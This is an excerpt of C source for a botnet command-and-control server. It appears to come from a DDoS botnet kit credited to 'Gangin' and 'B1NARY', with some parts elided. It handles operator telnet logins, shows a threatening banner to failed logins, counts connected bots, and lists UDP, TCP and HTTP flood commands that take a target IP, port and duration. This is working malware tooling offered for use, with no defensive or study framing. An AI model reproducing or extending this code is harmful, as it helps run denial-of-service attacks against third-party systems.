...
void *titleWriter(void *sock) 
{
        ...
        while(1)
        {
                ...
                sprintf(string, "%c]0;Bots connected: %d | Crackerz connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *sock)
{
        ...
        if(send(thefd, "\x1b[31mUsername:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        ...
        if(send(thefd, "\x1b[32m*          IP LOGGED CRACKER           *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[32m*   YOUR SCREWED, IM COMMING AFTER YOU *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[32m****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
        goto end;
        fak:
        ...
        if(send(thefd, "\x1b[31m*           Welcome To Gangin          *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m*	  Made By: ~ Gangin ~ & ~B1NARY~   *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m*       Type //HELP For Commands!      *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &titleWriter, sock);
        ...
        if(strstr(buf, "//HELP"))
		{  
			sprintf(botnet, "\x1b[31m[+] Attack Commands [+]\r\n", clientsConnected(), managesConnected);
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
        if(strstr(buf, "//HELP"))
		{  
			sprintf(botnet, "\x1b[31m[+] Attack Commands [+]\r\n\r\n\x1b[31m~[UDP]~ !* UDP <IP> <PORT> <TIME> 32 65 100\r\n\x1b[31m~[TCP]~ !* TCP <IP> <PORT> <TIME> 32 all 65 100\r\n\x1b[31m~[HTTP]~ !* HTTP <WEBSITE> <TIME>\r\n\x1b[31m~[KILLS ALL ATTACKS]~ !* KILLATTK\r\n\r\n\x1b[31m[+] Other Commands [+]\r\n\r\n\x1b[31m~[BOT COUNT]~ //BOTS\r\n~[TELNET STATUS]~ //STATUS\r\n\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
	    ...
	    if(strstr(buf, "//BOTS")) 
	    {  
		  sprintf(botnet, "Bots connected: %d | Crackerz connected: %d\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } 
                trim(buf);
                if(send(thefd, "\x1b[32m> \x1b[0m", 11, MSG_NOSIGNAL) == -1) goto end;
